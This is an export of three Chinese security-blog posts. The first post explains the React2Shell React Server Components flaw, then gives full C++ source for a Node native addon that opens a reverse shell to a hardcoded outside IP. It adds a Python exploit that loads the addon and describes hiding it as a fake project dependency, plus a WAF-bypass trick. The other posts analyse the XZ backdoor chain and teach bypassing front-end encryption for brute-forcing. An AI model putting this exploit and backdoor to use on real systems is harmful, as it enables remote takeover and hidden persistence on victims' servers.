[{"title":"React2ShellNode后门上线","path":"/posts/cada0cca/","content":"React2Shell_Node后门上线漏洞本身原理阐述都是翻译的外网跟踪，想看Node后门实现的直接翻到后面即可 漏洞复现分析：https://www.stork.ai/blog/reacts-server-killing-flaw-explained?utm_source=chatgpt.com 原型污染听起来很抽象，但在 JavaScript 中，它是最危险的漏洞类型之一。 原型污染并非破坏单个对象，而是允许攻击者篡改 Object.prototype 本身，它是 Node 或浏览器进程中几乎所有对象的共享祖先。一旦这个根对象被攻破，整个对象图就会开始继承攻击者控制的属性。 React Server Components 正是由于其 React Flight Protocol 的路径遍历逻辑而陷入了这个陷阱 。反序列化器支持基于冒号的语法来遍历嵌套结构，因此像 :$1:fruit:name 这样的引用意味着“先遍历 chunk 1，然后是 fruit，最后是 name”。研究人员发现，他们完全可以将普通的键替换为 JavaScript 内部的键，并请求 :__proto__。 一旦攻击路径到达 __proto__，攻击者就可以开始写入它。通过发送精心构造的 Flight 数据块，他们可以执行类似 payload: :$1:__proto__:pwned: yes 的操作，这实际上会将 Object.prototype.pwned 设置为 yes。从那时起，进程中的每个普通对象都会突然拥有一个 pwned 属性，即使是在攻击请求完成后很久才创建的对象也不例外。 Flight 数据结构示例： :$1:fruit:name 意思是： 跳到 chunk 1 找 fruit 取 name 类似 JSON Pointer YAML Path 的轻量版。 研究员发现： 如果把 fruit 换成 __proto__，反序列化器不会管你是不是内部关键字段，它直接跳过去。 攻击者仍然需要一种方法将损坏的对象图转化为可执行的系统命令。React2Shell 的最终技巧是将这个被污染的原型链接到一个完全武器化的远程代码执行路径，而它所使用的仅仅是 JavaScript 自身的反射特性和异步语义。 一旦攻击者控制了基础对象原型，他们就可以沿着原型链遍历，最终找到全局函数构造函数。在 JavaScript 中，每个函数最终都继承自 Function.prototype，而 Function 本身可以通过类似 ().constructor.constructor 的构造函数访问。 有了这种访问权限，有效载荷只需执行所有“no eval”绕过方法都会执行的操作： new Function(require(child_process).execSync(id);) 仍然面临一个问题：**他们可以创建恶意函数，但却无法控制任何明显的调用点。**他们需要利用服务器自身的控制流自动调用该函数，而无需在应用程序代码中显式调用 malicious() 函数。 JavaScript 的 await 关键字弥补了这一缺失环节。其底层原理是 await value 检查 value 是否可执行 then，如果可执行，则调用 value.then(resolve, reject)。 通过污染共享原型，定义一个指向攻击者函数实例的 .then 属性，任何等待的对象都会突然变成一个触发器。当 React 服务器组件代码在反序列化值上执行 await 时，JS 引擎会忠实地调用 .then，从而执行任意 shell 命令。无需额外的钩子，也无需任何奇怪的工具——仅仅是普通的异步代码路径就变成了一个通用的远程代码执行跳板。 React2Shell攻击路径： Flight path traversal → 能访问 __proto__ __proto__ 被赋值 → 污染 Object.prototype 所有对象继承 .then = attacker_function RSC 反序列化过程中使用了 await await 自动调用攻击者注入的 .then .then 内使用 Function 构造器 → 访问 Node.js 原生模块 最终触发系统命令： Node后门实现在和几位师傅的讨论中，对这个漏洞的利用有提到一个白名单防上车的权限维持需求。当时还在威胁狩猎和广泛利用阶段，因此只草创了几个思路 修改源码 采用token注册制 只有请求头中带有某个特殊的token才放行 其他的都返回伪装的正常响应，这个就比较 、直接布waf，然后通过next.js在解析multipart包的时候使用了busboy这个库，这个库实现了RFC 7578中声明的charset选项，所以我们可以通过一些特殊的charset绕过WAF对CVE-2025-55182的拦截 在一定程度上也起到防上车的效果，但是太过简单粗暴容易被察觉 当时思考了一下，想到了一个新的方案。利用Node自带的C++原生 自己编写一个.node插件，也是走的直接修改源码并import 这个node插件动态加载，本质上还是以修改源码为主，但是作为依赖和二进制文件有先天的隐蔽优越性，因此就打算尝试一下。 但是在复现的过程中，虽然生成了对应的patch.node并在本地测试环境部署了，但遇到了NextJs的Edge Runtime以及Node Runtime两层相互隔离，无法读取到node插件的问题。因此这个插件如果通过修改源码直接import的方式，也是无法解决问题的。因为整个Web应用是运行在Edge Runtime下 是无法调用到文件系统中的patch.node的 这个时候我想到一种方法，在跟踪这个React2shell的攻击路径中我发现这个漏洞本身是在 Node.js 原生模块，那么也就是在Node Runtime中，我只需要修改poc，改为动态调用我的原生node后门，是否可以实现一个隐蔽化的仿依赖后门呢 答案是肯定的， 既然执行点最终落在 Node Runtime，那么没有必要把 payload 限制在命令执行层。NodeJS 自带的 Native Addon 机制允许动态加载任意 .node 文件，而 .node 本质就是一段 CC++ 写的共享库。 既然它能被动态加载，就能当作“依赖”。既然能当作“依赖”，你就能把它伪装成项目依赖的一部分。既然能伪装依赖，就能形成一个持久化、文件落地式的伪依赖后门。 这里我就只实现了Windows版本的一个测试用例 源码exec.cc这里是一个简单的反弹shell demo 这里可以直接编译成node上传到目标 #define WIN32_LEAN_AND_MEAN#include winsock2.h#include ws2tcpip.h#include windows.h#include node.h#include v8.h#include string#pragma comment(lib, Ws2_32.lib)using namespace v8;// Hardcoded reverse shell targetstatic const char* kRemoteIP = 8.138.168.33;static const int kRemotePort = 8888;void Run(const FunctionCallbackInfoValue args) Isolate* isolate = args.GetIsolate(); HandleScope scope(isolate); WSADATA wsa; if (WSAStartup(MAKEWORD(2,2), wsa) != 0) args.GetReturnValue().Set(String::NewFromUtf8(isolate, WSAStartup failed).ToLocalChecked()); return; SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); if (s == INVALID_SOCKET) WSACleanup(); args.GetReturnValue().Set(String::NewFromUtf8(isolate, socket failed).ToLocalChecked()); return; sockaddr_in srv; srv.sin_family = AF_INET; srv.sin_port = htons(kRemotePort); inet_pton(AF_INET, kRemoteIP, srv.sin_addr); if (connect(s, (sockaddr*)srv, sizeof(srv)) == SOCKET_ERROR) closesocket(s); WSACleanup(); args.GetReturnValue().Set(String::NewFromUtf8(isolate, connect failed).ToLocalChecked()); return; // Make the socket handle inheritable SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT); STARTUPINFOA si; PROCESS_INFORMATION pi; si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES; si.hStdInput = (HANDLE)s; si.hStdOutput = (HANDLE)s; si.hStdError = (HANDLE)s; char cmd[] = cmd.exe; BOOL ok = CreateProcessA( NULL, cmd, NULL, NULL, TRUE, // inherit handles CREATE_NO_WINDOW, // no visible window NULL, NULL, si, pi ); if (!ok) closesocket(s); WSACleanup(); args.GetReturnValue().Set(String::NewFromUtf8(isolate, CreateProcess failed).ToLocalChecked()); return; // 保持句柄不被关闭，避免反连瞬断：不关闭 socket，不关闭进程句柄 // 启一个后台线程永远阻塞，防止模块卸载 HANDLE hThread = CreateThread( NULL, 0, [](LPVOID) - DWORD Sleep(INFINITE); return 0; , NULL, 0, NULL ); if (hThread) CloseHandle(hThread); // 不等待子进程，不关闭 pi.hProcess，让 cmd.exe 拿着 socket if (pi.hThread) CloseHandle(pi.hThread); // 留着 pi.hProcess 和 s 直到进程结束 args.GetReturnValue().Set(String::NewFromUtf8(isolate, ok).ToLocalChecked());void Init(LocalObject exports) NODE_SET_METHOD(exports, run, Run);NODE_MODULE(exec, Init) poc直接运行poc即可 # /// script# dependencies = [requests]# ///import requestsimport sysimport jsonimport osif len(sys.argv) 3: print(Usage: python poc.py target_ip target_port) sys.exit(1)target_ip = sys.argv[1]target_port = sys.argv[2]BASE_URL = fhttp://target_ip:target_portprint(f[+] Target: BASE_URL)prefix_js = ( const m=process.mainModule.require(module); const req=m.createRequire(process.cwd()+/); const fs=req(fs);const path=req(path); const cand=[path.join(process.cwd(),node,exec.node),path.join(process.cwd(),exec.node)]; let ok=false,err=; for(const p of cand)tryif(fs.existsSync(p))req(p).run();ok=true;break;catch(e)err=String(e); if(!ok)throw new Error(exec.node not found +cand.join(|)+ +err); )crafted_chunk = then: $1:__proto__:then, status: resolved_model, reason: -1, value: then: $B0, _response: _prefix: prefix_js, _formData: get: $1:constructor:constructor, , ,files = 0: (None, json.dumps(crafted_chunk)), 1: (None, $@0),headers = Next-Action: xprint([+] Sending exploit...)try: res = requests.post(BASE_URL, files=files, headers=headers, timeout=5, allow_redirects=False) print(f[+] Status: res.status_code) try: print(res.text[:300]) except Exception: passexcept Exception as e: print(f[!] Error during POST: e) 绕过模块路径限制 → 构造伪造 require → 从当前目录加载名为 exec.node 的原生模块 → 调用其中的 run() 方法 → 回到 JS 层装作正常执行完毕。 效果这个时候就会尝试动态加载并反弹shell到VPS上 示例如下","tags":["CVE","Poc"],"categories":["research"]},{"title":"身份隐藏_无痕系列(3)","path":"/posts/bb65c661/","content":"APT态势与威胁情报系列之前刷公众号看到名为APT研究顶级会议的推文，被”保持好奇，永不停止学习”的精神深深打动，于是想要跟随前辈们的脚步，做一个系列，来一场纯粹的探索。 在我看来，APT 的核心不在于高阶的战术，而是隐藏。身份、流量、痕迹，层层伪装，长期潜伏**。这个系列的目标，就是把公开报告里这些“身份隐藏”的技法拆开，留下冷静的记录，让红队从中学会藏身，蓝队于此着手识别** 既要推荐“强调身份隐藏”的 APT 报告，又要有实战味。不打磨，不粉饰，直指“大隐隐于市”式的真实干货。下面是几份非常契合这类风格、强调“身份隐藏”的 APT 报告推荐，我将援引以下报告中涉及的事件作为本系列前几话的研究重点 Kaspersky — “Q2 2024 APT 趋势报告” Kaspersky — “Linux 平台 APT 攻击概览” 尽管这些事件在如今看来是比较陈旧的素材，但其构造攻击链条思路的精巧与所谓骗术的优雅,值得在当下蓝队安全体系逐渐完善的”攻防不对等”大情景下给予红队人员更深化的思考 XZ 后门事件 聚焦 liblzma backdoor 部分，感受供应链攻击如何做到“隐形入侵 + ”。 攻击背景 时间点：2024 年 3 月。 目标组件：XZ Utils 压缩库（liblzma），被广泛集成在主流 Linux 发行版中。 利用链条：因为 liblzma 被 OpenSSH 的 sshd 间接依赖，所以一旦构建过程被污染，就能在 sshd 进程中触发恶意逻辑。 攻击手法（身份隐藏 + 供应链渗透） 长期社工 + 社区潜伏 攻击者以“陈嘉昌”身份混入开源社区，参与开发讨论，伪造贡献记录。 在公开场合反复互动，建立“可信开发者”形象。 操控构建过程 恶意代码不是直接写进主分支，而是巧妙地放在测试构建辅助脚本中。 通过复杂的压缩脚本链条，最终影响到 liblzma，再间接作用于 sshd。 后门特性 在 sshd 进程中植入潜在的远程代码执行能力。 隐蔽度极高，普通代码审计几乎难以发现，直到二进制行为异常才被揭露。 这是供应链攻击的顶级案例，不仅是技术层面，更是 身份隐藏+社工渗透+长期潜伏 的完美结合。 事件时间线2024.01.19 XZ 网站被新维护者 （jiaT75） 移至 GitHub 页面2024.02.15 .gitignore 中新增 “build-to-host.m4”2024.02.23 引入两个包含恶意脚本阶段的“测试文件”2024.02.24 XZ 5.6.0 发布2024.02.26 CMakeLists.txt 提交破坏 Landlock 安全功能的内容2024.03.04 后门导致 Valgrind 出现问题2024.03.09 更新两个“测试文件”，修改 CRC 功能，修复 Valgrind 问题2024.03.09 XZ 5.6.1 发布2024.03.28 发现错误，Debian 和 RedHat 通知2024.03.28 Debian 将 XZ 5.6.1 回滚至 5.4.5-0.2 版本2024.03.29 OSS-security 邮件列表发布邮件2024.03.29 RedHat 确认后门 XZ 已在 Fedora Rawhide 和 Fedora Linux 40 beta 中发布2024.03.30 Debian 关闭构建并启动重建进程2024.04.02 XZ 主开发商认同后门事件 更详细的xz 开源攻击时间线 核心1——长期社工 + 社区潜伏众所周知，在长期攻防的发展中，钓鱼近源攻击在突破外点的工作中起到了越来越重要的作用。为什么？很简单的道理，防御思维的盲点 是 红队机会 防御方热衷搞静态分析、模糊测试，偏执于“技术检测”,但对开源技术社区所谓的社区文化、人力缺口、社交信任几乎没有防护机制。xz后门事件便成为了血淋淋的例子**，高级的攻击者不和防御机制玩所谓的”签名对抗”，而是接触开源文化，玩信任经济，在社会工程学上不断赢得防御方的正反馈，逐步化身为可信用户植入后门。**下面就讲讲JiaTan的潜伏大戏 2021JiaT75（Jia Tan）创建了他们的 GitHub 帐户并打开了一个PR用于修改警告功能中的文本提示，同时利用不安全的变体替换了safe_print，同时这份代码在没有任何讨论的情况下就被合并了。 20222022年4月，Jia Tan通过邮件列表提交了补丁,同时出现了一个新角色——吉加尔·库马尔 ，他向开源社区施压并不断要求为xz添加另一个维护者 在向 Lasse Collin 施压添加另一名维护者的电子邮件三天后，JiaT75 首次提交PR给 xz： 测试：为硬件功能创建了测试。 自从这次提交以来，他们正式成为 xz 的定期贡献者 另一个帐户—— 丹尼斯·恩斯 （Dennis Ens） 也参与了施压，要求**维护者给出XZ for C的维护权。**电子邮件格式相似，姓名+数字格式相似。这个帐户也从未在 xz 讨论之外出现过，也没有发现任何相关的帐户。 从这些账户特征作为分析的出发点，就可以从中发掘出这极可能是一场有组织性的开源文化心理压迫，通过多个账户向维护者施压并提升关键用户的可信度，并逼迫维护者让权 本质上就是典型的 astroturfing（人造舆论场）。多个账号协调一致，不断提出“增加维护者交出权限”的要求。邮件往复堆叠，给单一维护者（Lasse Collin）营造持续的心理压力。 利用维护者精力有限+孤立无援的状态，通过群体施压逼迫让权。 2023JiaT75 于 2023 年 1 月 7 日合并了他们的第一次提交，从这天起，他正式进入“可信开发者”行列，具备了在仓库里直接推动变更的能力。 3 月，Google oss-fuzz 中的主要联系电子邮件更新为 JiaTan 的，而不是 Lasse Collin。这标明着JiaTan正式谋权成为了官方维护者之一，项目安全测试的第一手沟通渠道也被转移到JiaTan者手上。 同时 对应本次供应链的漏洞关键代码也成功落地，虽然 Lasse Collin 被认为是该漏洞的作者，但 Jia Tan 也参与了该漏洞的开发，该漏洞最初由 Hans Jansen 于 6 月份编写： Commit: liblzma: Add ifunc implementation to crc64_fast.c PR: Replaced crc64_fast constructor with ifunc by hansjans162 也就是**Hans 写代码 → Jia 推提交 → 署名套到 Lasse。** 事实证明，黑客可以为了你左右脑互博 对应的,在这里的Author署名被套到了Lasse HansJansen的账户在此前后几乎没有任何账户活动，只是为了将危险代码落地到XZ的官方代码中 有人生成 2024一个针对 Google oss-fuzz 的拉取请求 ，把项目 URL 从 tukaani.org/xz/ 改成 xz.tukaani.org/xz-utils/。看似是个普通的“项目路径调整”。 原始域名 tukaani.org 在芬兰的一个主机商上托管，是 Lasse Collin 掌控的基础设施。 新增的 xz.tukaani.org 子域却指向 GitHub Pages，控制权转移到了攻击者能操作的范围。 结果：项目外部的官方入口逐步被 Jia 掌控。 包含执行此后门所需的最后步骤也被添加到存储库： Tests: Add a few test files Tests: Update two test files 后续则是被某个安全研究员发现对应 liblzma模块占用了大量CPU时间，导致了延迟，因此深入的探究并发现了该漏洞利用链 核心2 ——操作构建过程植入后门的引导程序，是Jia Tan在2024年,也就是潜伏最后阶段提交的两个测试文件[bad-3-corrupt_lzma2.xz,good-large_compressed.lzma]，这些文件看似无害，但实际上攻击者可以在需要时提取隐藏在错误数据中的shell脚本与后门。 这一段已经是 XZ backdoor 的“武器化阶段”，之前几个月都是打地基、养身份、铺环境，现在是真正让后门能跑起来了 1. 控制分发入口 Github Releases：表面上发的是正常源码，里面虽然有测试文件但不会直接执行 → 无害。 xz.tukaani.org：关键！大多数 Linux 发行版不是从 Github 拉源码，而是从 xz.tukaani.org（也就是JiaTan在2024年恶意篡改导向他个人接管的gitpage） 下载。 这个子域名已经被 Jia Tan 接管。 于是 真正带恶意的版本只在这个 URL 发布。 这就像在“官方商店”和“供应链仓库”里分别放不同的货，测试者看到的干净，发行版打包用的却是投毒版。 大多数发行版都使用此 URL，下载时，它附带一个名为 build-to-host.m4 的文件，其中就包含恶意代码。 它会在构建过程（./configure 阶段）被执行，这意味着只要有人打包编译，就会触发。这行代码主要用 tr 修复一个看似“坏掉的”测试文件：bad-3-corrupt_lzma2.xz。把修复后的数据管道给 xz -d 解压，解压的数据隐藏了一个 shell 脚本，最后使用 build-to-host.m4 触发的binbash执行这个shell脚本 2.Payload解密上线后门 恶意 .m4 文件释放的shell脚本首先会检查： 是否在 Linux 系统上运行； 是否在正确的 build 流程中（避免在错误环境里暴露） 下一阶段载荷载体：good-large_compressed.lzma 文件表面上是“正确压缩的 XZ 测试文件”。 实际上在解压出来的数据里混入了大量“垃圾字节”，恶意 payload 被埋在其中。 伪装点：文件名里写着“good”，压缩也确实没问题，更容易骗过人工审查。 因此如何通过清洗下一阶段载荷载体中的垃圾数据，上线后门，shell脚本也有一套非常规的拆分拼接手法 head 命令流水线： 每次要么丢掉 1024 字节，要么提取 2048 或 724 字节。 循环下来，拼凑出 33,492 字节（ 2048*16 + 724）。 tail 命令： 在拼接结果里只保留最后 31,265 字节，丢掉其余部分。 3. 解码与执行 tr：做字符替换，把字节流进行一次简单位移还原（去混淆）。 xz -d：把转换后的数据再用 xz 解压，得到一段 原始 LZMA 流。 pipe → shell：最终把解压结果直接送进 /bin/sh 执行。 4. 最终提取阶段脚本先确认运行环境是否满足攻击者预设条件： 项目构建时是否启用了 IFUNC。 编译器是否为 GCC。 工程里是否存在攻击脚本需要的两个测试文件。 后门二进制提取流程 载体：依然是 good-large_compressed.lzma，但这次换了新的偏移位置。 提取过程通过一系列命令运行，每个命令的结果作为下一个命令的输入。格式化的单行代码如下所示： 操作链条： 用 XZ 工具先解压文件。 eval $i 执行一串 head 调用，切割数据流，逐步拼出隐藏 payload。 用自定义的 类 RC4 算法 对数据解密。 得到另一个压缩文件，再次用 XZ 解压。 按预定义偏移丢掉数据头的一部分字节，得到最终 payload。 把结果保存为 liblzma_la-crc64-fast.o。 意义：这个 .o 文件就是实打实的后门对象，会在后续 链接流程 中直接嵌入 liblzma。 脚本还会修改 crc_x86_clmul.h 文件里的函数：把 __get_cpuid 改成 _get_cpuid。避免编译链接时报错，确保恶意 .o 文件能顺利合入最终库。 这一步是“拼图最后一块”：没有这行改动，恶意对象可能不会被编译器接受。 感染链条概览入口：xz 5.6.0 5.6.1 tarball（从被攻陷的 xz.tukaani.org 下载）。 构建阶段： 调用恶意的 m4/build-to-host.m4 脚本。 脚本修复并解压 bad-3-corrupt_lzma.xz，释放出第一段 shell 脚本。 这个脚本再去解压 good-large_compressed.lzma 的一部分。 后续链条： 从 good-large_compressed.lzma 提取加密数据。 通过 AWK 实现的定制 RC4-like 算法解密。 再次用 xz 解压得到二进制数据。 最终落盘成 liblzma_la-crc64-fast.o，在编译链接过程中被嵌入库里。 由于本系列主要分析的是整条感染链条中JiaTan如何隐藏恶意代码与真实目的，因此对于后门代码的分析暂且搁置，感兴趣的朋友们可以自行查阅XZ后门分析。 在 XZ 案例中，攻击者直接利用了 开源文化的人际信任机制，通过身份渗透、社交压迫、长期 patch 养成，把恶意逻辑塞进了光天化日之下的构建脚本。 这种 高度互动的社交工程 + 技术投毒的结合，是过去大部分 APT 还没玩过的套路。 总结与警示XZ backdoor 事件并不是单纯的“代码被投毒”，而是一场 供应链信任实验：攻击者在身份层面通过社交工程和长期潜伏撬开了开源社区的信任防线；在技术层面，他们把恶意逻辑嵌进构建流程和测试文件里，环环相扣，直到最终在毫无预警的情况下把后门编译进关键的系统库。 对红队来说，这说明 身份与流程的操纵 已经可以和传统漏洞利用、0day 并列为攻击路径；未来高水平的 APT 行动很可能会把“人 + 代码 + 供应链”三者结合，达到比单纯技术投毒更深的隐匿。 对蓝队而言，警醒点在于： 你不能再只盯着二进制里的签名和恶意代码片段； 你必须把注意力扩展到 开源生态的人力因素、构建链的完整性 和 分发渠道的真实性； 单靠 fuzz、静态分析、CI 扫描都不够，因为这类攻击压根不是靠 0day，而是靠你习以为常的“流程漏洞”。 一句话：如果信任链本身被玩坏，再强的检测也只是摆设。","tags":["APT","身份隐藏"],"categories":["research"]},{"title":"JS对抗与逆向_实战篇","path":"/posts/7297c4f4/","content":"本质JS的对抗 本质无非就是开发者通过一系列加密算法防止用户恶意爆破，攻击者通过逆向，推测与实践实现自加密逻辑爆破的过程。 JS逆向懂得基础的JS知识，和调试方法，可以移步到基础篇 这里主要就不讲解如何详细的逆向了，我们直接切入正题： 如何解决数据包的修改问题。 关于如何找到JS中的加解密的方法，不一定非得找到加解密函数。无论是APP还是JS中可以先找到明文点。 什么是明文点？ 在前端进行复杂的请求操作时，肯定会经过一系列从A函数–B函数–C函数–D函数–E函数之类的流程， 那么在这个流程中，假设D函数是加密函数，那么ABC函数中原始请求参数均是明文的，这就是明文点，找到明文点后再一步步调试， 其实就能顺腾摸瓜找到加密函数了。 这里推荐一个环境靶场:http://39.98.108.20:8085 项目地址 0ctDayencrypt-decrypt-vuls: 加解密逻辑漏洞靶场 (github.com) v_jstoolscilamev_jstools: 模仿着写一个 chrome 插件，用来快速调试前端 js 代码。 (github.com) 一款比较好用的工具，能够一键监测JS中指定函数的调用 这里对工具的使用不做过多讲解，感兴趣的直接去看保姆级教程—前端加密的对抗（附带靶场）-先知社区的相关内容 以简单的例子使用与摸索就我而言 摸索了一下 主要还是以标准hook配置为主 使用正确账密123123并hook调试，取得更多有价值的信息 当登录成功时，我们可以以功能点为导向反向推理加密逻辑. 可以很清楚的看到数据的完整流动 明文点，用户传入账密和验证码 这里可以看见t.data就是用户传入的信息 用户登录认证逻辑 生成加密载荷并获取服务端响应 可结合网络查看请求包内容 回显登录成功 并重定向到dashboard 这里就完整的实现了一整套认证逻辑，本质上也是配合断点一步一步调试 得到完整的数据传输日志，同时也能利用函数步过大致定位到对应的加密逻辑 在这样的定位过程中 就能确定经过 t.data = l(n)后，data内容为密文，结合前面对登录功能点的推测与跟进，可确定t.data 即为 加密后的内容， 那么l() 函数即为加密函数 这个时候就可以进行跟进，典型的AES加密,甚至下面就是解密函数。其中t参数为原始的内容，f参数为密钥，h为密码。 同时所谓的签名 时间戳防绕也可以在最开始定位的加密逻辑中找到，那么这个时候就可以愉快的写脚本实现爆破了。 1. 为什么不用搜索的方式 如果能搜索到当然好，比如这个环境可以直接通过搜索AES的方式找到上下文。 但现在大部分webpack项目都自带混淆，在生产环境中许多变量和字符无法直接搜索，即使搜索到了阅读上下文也看不懂代码到底是个什么意思。 2. 明文点 上文提到明文点，在这个过程中我们跟踪的两个函数都是明文点，一个是v_jstools 提示的函数位置 u.interceptors.request.use((function(t){} ，还有一个是l()函数。生产情况下，我们可能无法直接分析出该函数的作用，即便看不懂，也是大有用处， 改包手法主流的修改方式。 分类 1、 修改当前的数据包 浏览器发包后，代理到burp上或通过其他的形式修改这个数据包的内容，主要针对当前数据包的修改 场景： 分析请求参数、添加额外参数、绕过前端校验等等 2、主动发包的加密与解密 脱离浏览器， 主动发包并加密， 对响应的数据包解密 场景： 自动化工具插入漏洞payload、暴力破解、重放测试等 修改当前数据包作用域修改法这里有个账号: test 密码:123 首先我们在表单处输入 test 密码 1234，很明显我们是无法登录的。 这时我们进入到调试中，走到加密前的一步，直接在作用域中修改即可登录成功 这个方式需要在加密启动和签名加签的同时启动 JS-forward 首先我们了解一下JS-forward运行原理，简单来说就是在明文点处插入一段JS代码，这段代码先通过AJAX请求将现有的请求内容发送给burpsuite，burpsuite拦截并修改内容后，返回到原始变量中，优点是操作比较统一，如果明文点正确，后续所有的改包操作都可以在burpsuite中进行 a. 找到明文点 工具链接:JS-Forward 确认明文变量名，然后启动JS-forward 这里我们需要将变量名向前看一点，确认明文变量就是t.data 启动JS-forward 输入变量名: t.data 输入数据类型： json (JS原始对象也可设置为JSON) 输入请求标识： REQUEST 这里的请求标识仅仅作为标识使用， 没有任何意义， 主要是为了在burpsuite中区分请求包和响应包 输入$end 结束后， 会监听2个端口 分别是38080， 28080， 还会生成一段JS代码我们留作后续使用。 b. 插入JS代码 JS-forward 的使用尽量在明文点的函数第一行插入相关代码，因为不知道后续代码会做什么样的操作。 具体的插入方式 b1： 找到F12–源代码–替换（覆盖）–点击选择文件夹–选择我们硬盘中一个空文件夹 如果浏览器有提示点击允许 具体的插入方式 b1： 找到F12–源代码–替换（覆盖）–点击选择文件夹–选择我们硬盘中一个空文件夹 b2: 在 网页–明文点JS文件处–右键–替换内容 （因为只有这样才能修改JS中的代码） b3: 将JS-forward中生成的代码，复制到函数第一行，Ctrl+S保存 c. 打开burpsuite 关闭调试功能或关闭F12，刷新页面，再次发包时即可接收到明文信息 d. 注意 能够理解原理的话， 尽量自己思考思考。此功能与浏览器–burpsuite代理无关，浏览器的代理可不设置为burpsuite。 另外在实际测试过程中谷歌浏览器会报CORS错误，edge正常，具体原因不明，以后有机会再分析 本质就是 我又新建了一个代理服务器 相当于两个代理服务器负责不同的职能 一个是负责爬取明文点转发并转回 Burp负责处理改包罢了 主动发包的加密与解密 以上方法只适合修改浏览器的提交操作后的数据包修改 优点：是简单易上手，就算是复杂的加密环境，只要找到明文点，后续工作不太复杂。 缺点：是无法应对主动发包的情况，比如要使用被动扫描工具，暴力破解，重放测试等需求的时候，无法自动化完成。 所以我们介绍第二类的解决方案，为什么不直接介绍这个方式呢？主要还是因为主动发包的加密和解密更加复杂，需要读懂目标JS代码环境中防范改包的一些业务逻辑，如果目标的JS代码混淆和加密并不是特别厉害，还是可以一试的。 在这之前再来了解一款工具 JS-RPCjxhczhlJsRpc: 远程调用(rpc)浏览器方法，免去抠代码补环境 (github.com) 所谓RPC，翻译过来是远程调用的意思，简单来说就是搭建一个桥梁让两个不同的应用系统之间一方能主动调用另外一方的api或函数。 我们知道浏览器中的加解密都是通过JS实现的，但如果想脱离浏览器在本地运行JS代码最大一个问题就是如何调用浏览器的api。举个例子: 比如我们想在python中执行JS中的解密函数，我们通常是两个方法： 方法： 读懂JS加密函数的内容，在python中通过python代码使用同样的逻辑来实现。 也就是所谓的读懂逻辑本地搓 通过execJs，selenium等框架执行指定的JS代码，理想状态是好的。但是，如果目标环境的加密很复杂，又伴随着一些复杂的对象操作，需要解析各种变量以及补环境来满足函数调用，意味着可能我们还没开始渗透就已经脱了几层皮了。 所以我们可以使用这款工具提高渗透测试前期的效率。 JS-RPC这款工具的**工作原理就是在控制台中执行一段代码，通过websocket与本地的python服务端相连。这样一来如果python中想要执行代码，只需要通过RPC即可调用控制台中的函数了，**不需要再本地还原。 步骤1. 先打开客户端，然后打开控制台，将JSrpc的注入代码输入 先输入函数内容 function Hlclient(wsURL) this.wsURL = wsURL; this.handlers = _execjs: function (resolve, param) var res = eval(param) if (!res) resolve(没有返回值) else resolve(res) ; this.socket = undefined; if (!wsURL) throw new Error(wsURL can not be empty!!) this.connect()Hlclient.prototype.connect = function () console.log(begin of connect to wsURL: + this.wsURL); var _this = this; try this.socket = new WebSocket(this.wsURL); this.socket.onmessage = function (e) _this.handlerRequest(e.data) catch (e) console.log(connection failed,reconnect after 10s); setTimeout(function () _this.connect() , 10000) this.socket.onclose = function () console.log(rpc已关闭); setTimeout(function () _this.connect() , 10000) this.socket.addEventListener(open, (event) = console.log(rpc连接成功); ); this.socket.addEventListener(error, (event) = console.error(rpc连接出错,请检查是否打开服务端:, event.error); );;Hlclient.prototype.send = function (msg) this.socket.send(msg)Hlclient.prototype.regAction = function (func_name, func) if (typeof func_name !== string) throw new Error(an func_name must be string); if (typeof func !== function) throw new Error(must be function); console.log(register func_name: + func_name); this.handlers[func_name] = func; return true//收到消息后这里处理，Hlclient.prototype.handlerRequest = function (requestJson) var _this = this; try var result = JSON.parse(requestJson) catch (error) console.log(catch error, requestJson); result = transjson(requestJson) //console.log(result) if (!result[action]) this.sendResult(, need request param action); return var action = result[action] var theHandler = this.handlers[action]; if (!theHandler) this.sendResult(action, action not found); return try if (!result[param]) theHandler(function (response) _this.sendResult(action, response); ) return var param = result[param] try param = JSON.parse(param) catch (e) theHandler(function (response) _this.sendResult(action, response); , param) catch (e) console.log(error: + e); _this.sendResult(action, e); Hlclient.prototype.sendResult = function (action, e) if (typeof e === object e !== null) try e = JSON.stringify(e) catch (v) console.log(v)//不是json无需操作 this.send(action + atob(aGxeX14) + e);function transjson(formdata) var regex = /action:(?actionName.*?),/g var actionName = regex.exec(formdata).groups.actionName stringfystring = formdata.match(/..data..:.*..\\w+..:\\s...*?../g).pop() stringfystring = stringfystring.replace(/\\\\/g, ) paramstring = JSON.parse(stringfystring) tens = `action:` + actionName + `,param:` tjson = JSON.parse(tens) tjson.param = paramstring return tjson 然后再输入 var demo = new Hlclient(ws://127.0.0.1:12080/ws?group=zzz); 其中变量名demo, 和group的值可以自己定 2. 记录加密函数首先还是调试到加密那一步 这里我们就知道了, 加密函数为l() 在控制台中输入window.enc = l, 控制台会显示当前函数信息, 并保存非形参的参数, 注册成功后我们可以主动调用enc()函数, 查看是否有效 window.enc() = l#测试enc(123) 3. 向JsRPC中注册这些函数#有参demo.regAction(enc, function (resolve, param) var res = enc(String(param)); resolve(res);) 4. 测试调用http://127.0.0.1:12080/go?group=zzzaction=encparam=123 懂得原理后, 我们可以继续进行操作了 JS-RPC + MITM 目前比较流行的一个解决方案, 通过 mitm 将原始请求发送到JS-RPC中进行加密后修改原始数据包内容, 再进行发包 mitmproxy 为一款代理工具, 你可以把他理解为python版的burpsuite, 可以进行拦截,改包等操作, 所以我们的思路是这样: 接下来就到实际应用的阶段了： 针对目前的靶场, 我们需要分析一下JS的代码。 几个关键的变量和函数： r： 很明显就是时间戳。 n： 原始的表单数据请求经过v() 函数处理后， 再进行JSON编码。 i： 使用p函数生成的requestId。 s： 使用MD5()函数生成的哈希值， 生成的方式为n+i+r的字符串拼接。 加密： 对变量n使用l()函数进行加密。 针对实际请求包的修改： 我们需要在请求头中添加 timestamp，requestId, sign 等字段。 然后修改明文请求体进行加密。 接下来就是实现： 1. 启动JS-rpc, 并注入代码 2. 打上断点并调试, 记录函数, 并注册记录 //时间戳window.time = Date.parse//requestIdwindow.id = p//v函数window.v1 = v//签名window.m = a.a.MD5//加密window.enc = l 注册 //md5函数demo.regAction(req, function (resolve,param) //请求头 let timestamp = time(new Date()); let requestid = id(); let v_data = JSON.stringify(v1(param)); let sign = m(v_data + requestid + timestamp).toString(); //加密请求体 let encstr = enc(v_data); let res = timestamp:timestamp, requestid:requestid, 